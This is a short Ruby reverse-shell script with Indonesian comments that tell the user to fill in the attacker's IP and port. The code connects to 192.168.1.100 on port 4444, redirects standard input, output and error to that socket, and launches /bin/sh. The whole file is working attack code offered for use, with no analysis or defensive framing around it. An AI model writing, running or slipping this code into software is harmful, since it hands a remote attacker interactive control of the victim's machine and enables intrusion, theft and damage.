require 'socket'

# Ganti dengan IP dan port attacker
attacker_ip = "192.168.1.100"
attacker_port = 4444

# Membuat koneksi ke attacker
begin
  socket = TCPSocket.new(attacker_ip, attacker_port)
  socket.puts "Reverse shell connected!"

  # Redirect input, output, dan error ke socket
  STDIN.reopen(socket)
  STDOUT.reopen(socket)
  STDERR.reopen(socket)

  # Menjalankan shell interaktif
  exec("/bin/sh")
rescue => e
  puts "Error: #{e.message}"
end
